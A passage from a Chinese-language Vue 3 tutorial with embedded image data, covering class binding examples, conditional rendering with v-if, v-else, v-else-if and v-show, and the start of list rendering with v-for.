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)

```html
<script>
  export default {
    data() {
      return {
        isActive: false,
      };
    },
  };
</script>
<template>
  <div class="switch" :class="{ active: isActive }">
    <span @click="isActive = !isActive"></span>
  </div>
</template>

<style scoped>
  .switch {
    width: 60px;
    height: 30px;
    border: 2px solid #ddd;
    border-radius: 30px;
    cursor: pointer;
  }

  .switch span {
    width: 24px;
    height: 24px;
    display: block;
    border-radius: 50%;
    background-color: #ddd;
    margin: 3px;
    transition: all ease 1s;
  }

  .switch.active {
    border: 2px solid skyblue;
  }

  .switch.active span {
    background-color: skyblue;
    transform: translateX(30px);
  }
</style>
```

### 5、案例：项目进度条

假设一个项目分四个阶段完成，我们会对项目每个阶段的完成进度进行评估。

> 以下为项目各阶段的进度评估数据

```json
state: {
    /*
        当前项目分四个阶段，0-4表示每个阶段的完成情况
        0-此阶段还没开始   进度条显示灰色
        1-提前完成    进度条显示 skyblue 天蓝色
        2-正常完成   进度条显示  green 绿色
        3-超时     进度条显示 orange 橘色
        4-严重超时  进度条显示 red 红色
    */
    I_state: 1,
    II_state: 3,
    III_state: 2,
    IIII_state: 0
}
```

> 我们需要根据每个阶段的完成进度，将进度条渲染成不同的颜色

![image-20230615204701531](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAA10AAABBCAIAAACl5Vl1AAASnUlEQVR4nO3dYWjbZsIH8H+PfnAgBwr0QIEWqtFBHTaoww5ic/kQhQzqkIMpdFCbDTpng87tweos3GY3L2/nrC+NnUGvaaGtW1iRCyt24Uo9uBLlQw8rsBIVesSBhqiwggVXsGEFGy7g94PsxHbsJN3d+3bt/r9PlvRIeiTlwz+PnufRrkqlAiIiIiL61fvNy64AEREREf0iMBcSEREREcBcSEREREQ25kIiIiIiApgLiYiIiMjGXEhEREREAHPhL0bZ+GZ08N3BwXfHM8/+jaM8TMan4/HpePJB+WcdoKhficen4/FLmrXleYpFK7egacvFn3OSNcu4nYhPnhh9N278rFpad8YH3x0crO5eNL9Pak9aFTiVab4KKzNu3+QtL4+IiOjXaffLrsAvS3EhkbjfkHWE/kDPvS7P5FZ7Kcl86qgImJnpdG6HZzqohEakjcUVNXIqrQEQ8/AZ8a33fSukznjFzevLRvy4P7IAAO4Z2feOq8W+T5Oj+/zp1vVH+cFs6JOIDuBQ2POBLHbWlzKTH40lnqJkavpKbd3Q1dW/9SR3eSLNp1HUH1O+vW3qv9th3hkbvw5A7F0Iufq2vNiWnpvaPQ0Qck+DhfO9g9Mm+szsvbC7s7GAEADK1oPs0k+19c+yxj1NA9z3Ncee9cN19bhd4louccmQP/NJuwHAujna7Wu6T42OqPnvfC2eAhER0SuLubBB2cyMTzSkASXp79np3pYxMb4pIbVxxlOXC434B2OZ6jFymrVdthQCrdaW9emgHQoB6KeCU24t3OfYYXXsasyejOj2z4dToW+GtdPuuv0t87qmNe1hprXlbW6P8ZfB8Tub1uZFwAKsCx8Pat3NG5Wv54Lv7LDODnlSjd73RBYuRK97Uyddmy64qJ0b9N9qWqlNva9N1Z1QXR43jyuReUt8hOy3PglERES/RsyF23N/ViicBAAYsx45kgOUy0uJI3VxxiE07HDALUsdbQ5WMu/pZsOaovZlcHwBgBi8rCoHdlCh3/YIm9aZNwPKpA5AHFF6f0hnLD3yXkDSVd/+lodQrj5KjK6pfteJDESnKABl/Su7Gu7w6d7EV7P6pBI4kFWPNmck+XQqrLh693c5OgXHbgB6ZP2Ae4GnqcDbY/XJulzUtHttL8X6h2b9o3mlfMbelhn/sM2L5vwSACAb/XAwsRt4LuKAVL4zHtmvxoZg6EtmrggAa6XSmqhcLhQu13asVq9W2xqH4DAGJMxb1g2/f6+Y+VqubQlc0HzOxpPnbg6euNL2ioiIiF5dzIUNxKOpylEr+X63/xZwJls57bbX2znMerZkN+X1vu0UNkezdR/G52o7bqJPNbx1LWpfegfP6gBw0OMoGsaDbWrofC/k3ZQdzVtjg76kBUD0xc+r8g9+1/tJy0r6hzoc964qraJhhyDgByMD4ND46IDDvOm3Y6X7TDxyWup9khq9YSV9/q5O9cJIQzQUnB75UN3r05UlvXZAQQCe24E4nbqVEQ91Sa71++ANnpO3aYcztfFLmY3FtaJ5b1MLZQMrN7/euGppKxCOAf9IeOWI54gCALfH3tiXCI50z15peiOcHns7Pba+dCZbOe12n1bVxx7/DUs/O+jtWlSrqVHqHZCbnmXH37e+DCIiolcVc+G2ajGxTsS9ayPbbe5nVioUi+0GZBRKjYvmw+qbWyyn4xNbdmgDAET7m3OheXNs0JcwAcAdvZ3w7Qf2zyaOa8OXLKwkRt352B019M7mGFvU7iQAyJ96hTsn/Has7IvOfu52AMpMInhveNbSZ//oMWcy6meu9f3Tvu5dvlpl7q9KlyMaALFXsoPUHtEOf+lTw2kE7xbcXdWyHv/noXZhuWqh3JALawIX53wHG1ctJwc/TQBy+LuwvNFNEF1vCkUjb0Fx2uVFUcSw9yNRetNTLVFYVM8mDbh8X/h7azXDQfvpSb6LafOxJ4Jw9Jiro30bJxER0euKufD/wNnhrrM7LCqNfhwYK0hXFW1sQoMYvJpUJABWZsoXx2dqeKQWOJ9pU+9PNTeerVmZM/7AV/bYYdGXVGsdCgXv+az63OO/YcHKjP++N3s+lTjpasiGz7LadQBetxX3fJKw2xrVm+FqB7093gu6WnD7k5aVOdUb3JtXj7SofSlvLj0FIPrOB6qZzyEHvwtmv5zVV4Ahl1OAdLpSOQ3zTjw9Hc9uczccsb+uhkaaWxUllyw3jU3psMO00OOW5b3Asq51uuS9DgDm9znAJe0zAaA/np1AYj7fhS0tpxO/CwT6BHS6wzeXlD1OZyc4XpmIiH6FmAt37Iu7hQlP3XI+9VHP2O1/96jC4VhhSMidiwBAv2d4QBZR1ibGNADf+EtrKXVGkXYDD3Q/ALgc6wMrnqTHPwrG5+0AI/oua4mjUm2Qhyv0bcx3UStBHrthAWb6T73Z26H4+Yivlg3z85lZAB8ETnxQNi8mkvCpTZ0R9/sS86WOkbFEZ2z8iAhUe0XW9610dAqOw1rvvbL3vY0GU+nIheyRC02XaT0cH99yTHdVw3CcKtPQtLpW1q43PS6HwwUYMPPPgL3FzHll+JIlfZzKXvaajzUM+aTOam071sypic1jgYzkWSNZt6wk/QE7eu53NvYmNBfntcYmXuR+3MGFEBERvYKYC3eso0sQBPNOPL0M7PEEjkkd7W5ec4Ksl411DU/Vr3AIAkzTHnvxtiQCgEM+t7jY7feeyqBT6LLPsma3YEnd9mvTlcTwm7UhzHAH/1rtBVgb5CEE1oBOZ+DbnLR/1P+VZgHWfDx0UfZ+WTut2O0G9BuJu5N3ozPmsCimpF1+IKpXwn3AwtQudwRQ1EeL8o9CqwlvAABPk6NS86w369anvwHgEGR5qN1R6ggtBlAnPh1MNB22v1sCDBjlMvAwEb1kAXC6XSJy6j1gSNqIln3hSilY3HoyR4ewcdpisSjU9x1NnJATrfYhIiJ6DTEXvphqu9fxu4Fj7QdRdHQJbYeldDUMVG6aTXDSs6uxUc06O9j4Sjrt31dNbxeSmseXtPqC6vWY72C7+WgE+cycMRAPfjKe7gynz3mFYrWZrKs/FP38wuB0JnJNM78O+x5MhVofwOV7q2FF+pOe9CfV39Gk2ua8zVwn5+ZO7rDsDtR6Meb/aSRvjOsAxHDoqAQg+P2SXJY69Nn1stbtwNYzEdbl17J2zulf8MdnItt0hSQiInodMRe+ECv/GADQ3bXFcGR8Gxq8336emv9QVaSj0cSzUedxRdruGYoDoVTOn3sqODuBjfEwDlk5IU5HrLOZ7KQsr/2sHnX7lEShEDMS6edKoL/aiy93xeuZ0AG3xykCVuaUP75pJpptjMTmTm60UVabMOuHcju6ukTAQvbrYGoBAJSZE7IDAByi0wVY+qZjHvKFfb2NHQ0Li8mp5MO6FeWsdt2yrLj/vKdwLVU5uj67taL+mJLvb/xuO2U3ERHRq4y58IWYuXsA4Du45YwrK7q2stX2DXt9qYoPD+O9rnED8tXHc4EDwHN96o9KZF4KJhOxo067JbAWUMLZSrTWlCV5T+54AubdonPzbDUHXaPALDRjGbX5+hRpuy94NPYvdORvBQZ9SVNc7La7Jz5JXpjRAYjHI4FDAFB8utX8ha31lwHAMrN2lWohzO7n193pALqdQ8ANGAs6ABy+Gjv6H/jySPH75JQFAKGjXjv3l57bOdopMQgSEdGvAHNhe7oa+TRqDUTW5zguz9+9YAFwe962P9fRxuFgbKBdYjO1idmmuVjK/8wbAOCs9h10iM63JMzrs74ebSW72PDRkXbNkC+stAY8t/vdGeUyyj8Vqhu2/Yvo7BIEoVwsllHIrcDVP+oWk6aV9A914JbPPO5PWgCU+IQdrRzS4Vjs97V9azMUeo/HZAmFR+rUDWN9cYM9cUy51HCLn5j2VIXdvxMASC4XbtiTXrtjXwfKt2YzLr/3QPtm3IfJqYfJtlsBwExdSQCAGPb227e8mDM0ABjalJaLembe4RxySZ0gIiJ6bTAXNrDmZ2M30pn7AIDvZ6cApT9aTTbiUvxLuzlJPzEyWr4cUybm5o63+vqI2x/6vO281uVNuTBv2e+WzcyVeHWW5n0e5aCeXnZ7kJ2dzgIoPLLLZNXpeLbp28o/S+7i4K5pe94bRdqL3E37d5uGsaKeuKLas8zUz1+IM9nKaSVxO2q6I/pKwu+yh2iIvmSsNrRZcB/bmLbQmLb7Iyr+iZBvP6ybWTsXej4MhfoAwLgxvrgnMNwvATBz9stgZ8mIx28ifz+WBgBZ3AOgmM9Xj6l8q4YOQb9zYvj9E9Lxu4sXva2z4XtXl66NNn5yr3FE+cP07PcA4Do1ar+SxpNM4hIAuA73Sk3/B6xoASVirTfxEhERvRaYCxuUVtLx6/WzBEpdnd3uoyF30Yh/6I0sAJCkA6a5kh6X06mTauKMz7k5hrzAvNYAYD2xR0VkZieaEqOemGzqKJeZnci0nMzlRfW6ZEADJOV8RBG0yIwBAMc9zpaln5uZTXF2naMvGD1zd3C9qn8I+Fs1l5q3TwQnDAA47HW3/jpfufAoPjYdx3vqatq73lbXA8MzURtH0uft3V/Uv/IOT1e/kGdaRcA0DQAo7etu22B4e6zn9li7jUBZ+y5mAIA3+J4LAJ7nEpOhtL1mZNOA7Gpbpovvl4mI6HXCXNhAcroBTeoLKJ94R90e1wERlpGeDkVmkjl76ufknHoE6Ymx4Dea/hd/zy01eksN/6ExjbzAvNYAitgbi53bukw+ey2eXq4Nnjj4H+hLB5dvMReQ9ouCo6xPeuIWADF42NMmVzm6BtzSvG7a30cekCSX1LVbEGDqN6dik5F0fX/Kv08Ndye9x0PBP/nlg4JjrWw+SCdnIpFbdpOnOzrpt2Ojo7PafpfPW8WiA+XFak/EtyTpmTZ1CQDE/h53tyUCFkTniD82o5invKN/2YjLxkQwsmc0dxsARt9qH5eHwqkv5MarK2pnR6fsMz7LJM9aAHAsMHoAeKZF3vdPzVsA3F9H/Q0tgubivIZHGQAYckrtBoITERG9iipU71+lQmljqfDXYF0EkwLXltY35jNhubpN9F5eqlQqlUo2uvP7fia7ZTWysRFZHgqEzsVinwfkvmrccZ1b3Lr62TN2QUX9sU2JH1WlscDiTO06jqir68X06KbjVK9OSearK4yYXHdB4kBI1bPqZ/LGHRNDcz/lUx/UF5LDfytsVOaHaMuEqyTzSxerxw79re55VJauHq7t0RfNPk4FG/bfqG0+qdhXlG/8XalUSo9SsXNXU9rc3WtB9/opflpST7oBMayVKo+vemuHFQdii+vnN2JNzYbu80tbPw4iIqJXC3Ph1qrff5MOh9RHheaNZio0IKIvmv3JXq7lwi/uFtq6G95JLqyU5r5ojkzS4VjtRG39jFxY+edcuA8QfapZV2wnubBSWb3sBYADSjS9tH53Co/vxo46RcB7bbVSqVRM1ScCEOWPL8zlK41WU5umgZSOpVYrlcq/VlMn3RDDc6XGPUzVJ0IciGYLlUqlUtKj6zlU+mKj7Ba5sHYHajYeX2U1M2cHvdWkTwTEkdhiww0vZc95a9UVnR9fXdrucRAREb1adlUqFVB75Yea5uj1HmzzfnXNNJ9KUrW3XDE3v5gH0N0rtyu/ozIAUH5qZB/XxgijS3I5pVbfAmlS/RwLBM/HAXfLwxf1xJVssalAMZcrOhsmslkrF5+X0fApkGrNu970uPau18Q0FjqcfeLmmpWfmsU9kr3B/Hva2u91721d/3Kx7nMkuwVhY4RvObdcdG56aV5eNvIHXBuzNhZN3TBLHVJvn7RxQQuJxP0i9ngCx9wO+07+tsfzjl2d2iMAOrp7XAdER4vOFOXcgtnd16LvKBER0WuMuZCIiIiIAOA3L7sCRERERPSLwFxIRERERABzIRERERHZmAuJiIiICGAuJCIiIiIbcyERERERAcyFRERERGRjLiQiIiIigLmQiIiIiGzMhUREREQEMBcSERERkY25kIiIiIgA5kIiIiIisjEXEhERERHAXEhERERENuZCIiIiIgKYC4mIiIjIxlxIRERERABzIRERERHZmAuJiIiICAB2v+wK/LL8j/HsZVeB/r/92bWnYTm56yVVhF4eX6V+add/82/gV6fyXw1/A6urqy+rJvSyvPHGGy+7Cr8IbC8kIiIiIoC5kIiIiIhszIVEREREBDAXEhEREZGNuZCIiIiIAOZCIiIiIrIxFxIRERERwFxIRERERDbmQiIiIiICgF2VSmX7UkRERET0umN7IREREREBzIVEREREZGMuJCIiIiKAuZCIiIiIbMyFRERERAQwFxIRERGRjbmQiIiIiADgfwED4K1m56+YEgAAAABJRU5ErkJggg==)

**完整版代码**

```html
<script>
  export default {
    data() {
      return {
        state: {
          I_state: 1,
          II_state: 3,
          III_state: 2,
          IIII_state: 4,
        },
        // 数组
        arr: ["", "skyblue", "green", "orange", "red"],
        // map
        map: new Map([
          [0, ""],
          [1, "skyblue"],
          [2, "green"],
          [3, "orange"],
          [4, "red"],
        ]),
      };
    },
  };
</script>

<template>
  <div class="wrap">
    <h3>项目每个阶段的完成情况</h3>
    <div class="progress-bar">
      <span :class="arr[state.I_state]"></span>
      <span :class="arr[state.II_state]"></span>
      <span :class="arr[state.III_state]"></span>
      <span :class="arr[state.IIII_state]"></span>
    </div>
  </div>

  <div class="wrap">
    <h3>项目每个阶段的完成情况</h3>
    <div class="progress-bar">
      <span :class="map.get(state.I_state)"></span>
      <span :class="map.get(state.II_state)"></span>
      <span :class="map.get(state.III_state)"></span>
      <span :class="map.get(state.IIII_state)"></span>
    </div>
  </div>
</template>

<style>
  .wrap {
    width: 80%;
    margin: 50px auto;
  }

  .progress-bar {
    height: 10px;
    display: flex;
  }

  .progress-bar span {
    height: inherit;
    flex: 1;
    margin-right: 5px;
    background-color: #ddd;
  }

  .progress-bar span.skyblue {
    background-color: skyblue;
  }

  .progress-bar span.green {
    background-color: green;
  }

  .progress-bar span.orange {
    background-color: orange;
  }

  .progress-bar span.red {
    background-color: red;
  }
</style>
```

## 三、条件渲染

条件渲染是指根据条件来渲染一块内容，条件渲染指令有：`v-if`、`v-else`、`v-else-if`、`v-show`

> 我们会从以下几个方面来展开学习

- v-if 指令
- v-else 指令
- v-else-if 指令
- 注意事项
- v-if 与`<template>`
- v-show 指令
- 对比 v-if 与 v-show
- v-if 案例：根据用户等级显示相关权益
- v-show 案例：选项卡特效

### 1、v-if 指令

`v-if` 指令用于条件性地渲染一块内容。这块内容只会在指令的表达式返回真值时才被渲染。

```html
<div v-if="true">此处内容显示</div>
<div v-if="false">此处将不会渲染在页面中</div>
```

**代码演示**

```vue
<script>
export default {
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<template>
  <div class="box1" v-if="isShow">此处内容显示</div>
  <div class="box2" v-if="!isShow">此处将不会渲染在页面中</div>
</template>
```

> 以上代码最终渲染后效果如下：

![image-20230615210132776](https://www.arryblog.com/assets/img/image-20230615210132776.b28599f0.png)

### 2、v-else

`v-else`指令需要和`v-if`指令配合一起使用，其用法和功能与 JS 中的`if ...else` 一样

```html
<!--v-if的值为false，则渲染v-else指令绑定的元素-->
<div class="box1" v-if="false">此内容不会渲染在页面中</div>
<div class="box2" v-else>此处内容显示</div>

<!--v-if的值为true，则渲染v-if指令绑定的元素,v-else指令绑定的元素不会被渲染-->
<div class="box1" v-if="true">此内容显示</div>
<div class="box2" v-else>些内容不会渲染在页面中</div>
```

**代码演示**

```vue
<script>
export default {
  data() {
    return {
      isShow: true,
    };
  },
};
</script>

<template>
  <button @click="isShow = !isShow">切换显示</button>
  <div class="box1" v-if="isShow">box1内容</div>
  <div class="box2" v-else>box2中内容</div>
</template>
```

> 以上代码最终渲染后效果如下图：

![GIF2023-6-1521-04-13](https://www.arryblog.com/assets/img/GIF2023-6-1521-04-13.12940b3b.gif)

注：

一开始只显示了 box1，点击按扭后，将变量`isShow`的值修改成`false`，则将 box1 从页面，显示 box2

### 3、v-else-if

`v-else-if`需要与`v-if`指令配合，其的用法和功能与 JS 中的`if ...else if` 一样，所以`v-else-if`指令可以连续多次重复使用。

`v-if`、`v-else-if`、`v-else`可以组合一起使用，与`JS`中的`if..else if... else`用法和功能一样。

```html
<script>
  export default {
    data() {
      return {
        age: 40,
      };
    },
  };
</script>

<template>
  <div class="box1" v-if="age >= 60">老年</div>
  <div class="box2" v-else-if="age >= 30">中年</div>
  <div class="box3" v-else-if="age >= 18">青年</div>
  <div class="box3" v-else-if="age >= 12">少年</div>
  <div class="box4" v-else>儿童</div>
</template>
```

> 以上代表最终渲染后效果如下：

![image-20230427204525649](https://www.arryblog.com/assets/img/image-20230427204525649.1777da19.png)

注：

如果我们把`age`的值改为 28，则最终显示**青年**。如果把 age 的值改为 60，则最终显示**老年**

### 4、注意事项

`v-if`、`v-else-if`、`v-else` 这些指令之间必需紧跟的，中间不能有其它元素间隔着。

> 如下写法将会抛出错误，代码无法正常运行

```html
<!--因为`.box`元素打断了`v-else-if`指令的连续性-->
<div class="box1" v-if="age >= 60">老年</div>
<div class="box2" v-else-if="age >= 30">中年</div>
<div class="box">这种写法将会报错，因为他打断了if指令的连续性</div>
<div class="box3" v-else-if="age >= 18">青年</div>
<div class="box3" v-else-if="age >= 12">少年</div>
<div class="box4" v-else>儿童</div>
```

### 5、v-if 与 `<template>`

如果我们想在`v-if`指令为真时，显示一组元素，而不是单个元素，那要如何实现呢 ？

- 方案一：显然代码写起来不够优雅

```html
<h3 v-if="person.age > 30">{{ person.username }}相关信息如下</h3>
<div v-if="person.age > 30">年龄：{{ person.age }}</div>
<div v-if="person.age > 30">年龄：{{ person.sex }}</div>
```

- 方案二：这种方案相比第一种要好些，但是让代码的层级变的更深了

```html
<div class="box1" v-if="person.age > 30">
  <h3>{{ person.username }}相关信息如下</h3>
  <div>年龄：{{ person.age }}</div>
  <div>年龄：{{ person.sex }}</div>
</div>
```

- 方案三：`v-if`指令与`<template>`标签配合，最终`<template>`不会被渲染到页面中。

```html
<!--最佳方案-->
<template class="box1" v-if="person.age > 30">
  <h3>{{ person.username }}相关信息如下</h3>
  <div>年龄：{{ person.age }}</div>
  <div>年龄：{{ person.sex }}</div>
</template>
```

**代码演示**

```vue
<script>
export default {
  data() {
    return {
      person: {
        username: "清心",
        age: 35,
        sex: "女",
      },
    };
  },
};
</script>

<template>
  <template class="box1" v-if="person.age > 30">
    <h3>{{ person.username }}相关信息如下</h3>
    <div>年龄：{{ person.age }}</div>
    <div>年龄：{{ person.sex }}</div>
  </template>
</template>
```

> 最终渲染后效果如下：

![image-20230615212516362](https://www.arryblog.com/assets/img/image-20230615212516362.9c7d07d2.png)

### 6、v-show

`v-show`指令用来按条件显示一个元素，其用法与`v-if`一样，但他与`v-if`有以下不同：

**`v-if`指令**

- `v-if`指令是将元素从 DOM 中移除来实现显示与隐藏
- `v-if`指令可以在`<template>`元素上使用
- `v-if`指令可以与`v-else`、`v-else-if`指令搭配使用

**`v-show`指令**

- `v-show` 会在 DOM 渲染中保留该元素；`v-show`实现显示与隐藏，本质是通过操作元素的`display`属性来实现。
- `v-show` 不支持在 `<template>` 元素上使用
- `v-show`指令只能单独用，不能 `v-else` 等指令搭配使用

```html
<div v-show="true">该元素最终显示在页面中</div>
```

**代码演示**

```html
<script>
  export default {
    data() {
      return {
        isShow: true,
      };
    },
  };
</script>

<template>
  <div v-show="isShow">v-show 内容显示</div>
  <div v-show="!isShow">v-show 内容隐藏</div>
</template>
```

> 以上代码最终渲染后效果如下：

![image-20230427211730033](https://www.arryblog.com/assets/img/image-20230427211730033.1aa86572.png)

### 8、对比 v-if 与 v-show

`v-if`与`v-show`都可以用来控制元素的显示与隐藏，那实际开发中，我们应该如何选择呢？

我们通过对比`v-if`与`v-show`在性能上的细微差别来确定，我们应该在什么场景下使用他们更合理

**v-if 的特点**

- `v-if` 是“真实的”按条件渲染，因为它确保了在切换时，条件区块内的事件监听器和子组件都会被销毁与重建，所以每次切换时的开销会很大。
- `v-if` 也是**惰性**的，如果在初次渲染时条件值为 false，则不会做任何事，所以初次渲染时速度会很快。

**v-show 的特点**

- 首次渲染时开销会很大，因为`v-show`元素无论初始条件如何，始终会被渲染，只是根据`CSS`的`display`属性来决定显示与隐藏。
- 后期切换时，性能消耗较小，因为切换只是在更改 css 的 display 属性值。

总结

- `v-if` 初次渲染开销少，而后期切换开销会更高； `v-show` 有更高的初始渲染开销，后期切换开销少
- 如果后期需要频繁切换，则使用 `v-show` 较好；如果在运行时绑定条件很少改变，则 `v-if` 会更合适。

**注意**

如果我们追求网站首屏的加载速度，即使后期切换开销高，在渲染首屏内容时，也要考虑使用`v-if`

### 9、根据用户等级显示相关权益

根据用户的类型来渲染对应的内容，如果用户为 Vip，则显示会员权益，如果不是，则显示提示内容 。

> 以下内容渲染后，后期不会频繁切换，则使用`v-if`来渲染更合适。

```vue
<script>
export default {
  data() {
    return {
      userInfo: {
        username: "清心",
        vipType: 1, // 1是Vip，0是普通用户
      },
    };
  },
};
</script>

<template>
  <h3>
    用户名：{{ userInfo.username }}
    用户类型：
    <span v-if="userInfo.vipType === 1">VIP</span>
    <span v-else>普通用户</span>
  </h3>
  <h4>----------会员权益----------</h4>
  <!-- 利用v-if进行条件判断 -->
  <template v-if="userInfo.vipType === 1">
    <div>1、购物享积分1元1分</div>
    <div>2、积分当钱花</div>
    <div>3、积分兑换好礼</div>
  </template>
  <div v-else>你目前还不是会员，不享有任何权益</div>
</template>
```

> 当`userInfo.isVip === 1`时，最终渲染效果如下：

![image-20230427220526310](https://www.arryblog.com/assets/img/image-20230427220526310.bb35d9c5.png)

> 当`userInfo.isVip === 0`时，最终渲染效果如下：

![image-20230427220546036](https://www.arryblog.com/assets/img/image-20230427220546036.e075b928.png)

### 10、选项卡特效

选项卡效果涉及到用户会频繁在各个选项之间来回切换，所以更适合用`v-show`，因为切换的开销低

> 如果你想让你的网站首次渲染页面时更快，可以改用`v-if`，实际开发主要还是根据用途来选择。

![GIF2023-5-517-29-13](https://www.arryblog.com/assets/img/GIF2023-5-517-29-13.0ba14b9c.gif)

**代码示例**

```html
<script>
  export default {
    data() {
      return {
        currentIndex: 0,
      };
    },
    methods: {
      changeIndex(index) {
        this.currentIndex = index;
      },
    },
  };
</script>

<template>
  <div class="music">
    <div class="tab">
      <div
        class="tab-item"
        :class="{ active: currentIndex === 0 }"
        @click="currentIndex = 0"
      >
        流行
      </div>
      <div
        class="tab-item"
        :class="{ active: currentIndex === 1 }"
        @click="currentIndex = 1"
      >
        经典
      </div>
      <div
        class="tab-item"
        :class="{ active: currentIndex === 2 }"
        @click="currentIndex = 2"
      >
        伤感
      </div>
      <div
        class="tab-item"
        :class="{ active: currentIndex === 3 }"
        @click="currentInde = 3"
      >
        抖音爆红
      </div>
    </div>

    <div class="tab-content">
      <div v-show="currentIndex === 0">流行音乐</div>
      <div v-show="currentIndex === 1">经典音乐</div>
      <div v-show="currentIndex === 2">伤感音乐</div>
      <div v-show="currentIndex === 3">抖音爆红音乐</div>
    </div>
  </div>
</template>

<style>
  .music {
    width: 600px;
  }

  .tab {
    height: 40px;
    display: flex;
  }

  .tab-item {
    width: 100px;
    height: 40px;
    text-align: center;
    line-height: 40px;
    margin-right: 5px;
    background-color: #ddd;
    cursor: pointer;
  }

  .tab-item.active {
    background-color: skyblue;
    color: #fff;
    font-size: 18px;
  }

  .tab-content {
    height: 400px;
  }

  .tab-content div {
    border: 1px solid skyblue;
    height: 400px;
    font-size: 50px;
    text-align: center;
    line-height: 400px;
  }
</style>
```

## 四、列表渲染

vue 提供了 v-for 指令，可以基于这个指令将数组、对象等数据结构渲染成一个列表。

> 本小节需要学习的 v-for 指令相关内容，如下：

- v-for 基本用法
- v-for 遍历对象
- v-for 与整数
- v-for 多层嵌套循环
- v-for 与`<template>`
- v-for 渲染二级菜单
- v-for 与 v-if 的结合
- v-for 与解构赋值
- key 属性
- 展示数组过滤后数据
- 对筛选后数组排序
- 只对数组排序，并显示结果

### 1、v-for 基本用法

`v-for`指令本质就是通过循环方式来遍历数组或对象等，并将其渲染成一个列表。

`v-for`指令的值需要使用`item in arr` 形式的特殊语法

- `arr`是源数据的数组
- `item`是迭代项的别名（别名可以自定义）

**代码示例**

```html
<script>
  export default {
    data() {
      return {
        arr: ["人气TOP", "爆款套餐", "咖啡", "奶茶", "甜品小点"],
      };
    },
  };
</script>

<template>
  <ul>
    <!-- 以下方式相当于对数组arr进行迭代，item为迭代项-->
    <li v-for="item in arr">{{ item }}</li>
  </ul>
</template>
```

> 以上代码，最终编译后的结果如下：

```html
<ul>
  <li>人气TOP</li>
  <li>爆款套餐</li>
  <li>咖啡</li>
  <li>奶茶</li>
  <li>甜品小点</li>
</ul>
```

**获取数组每项索引**

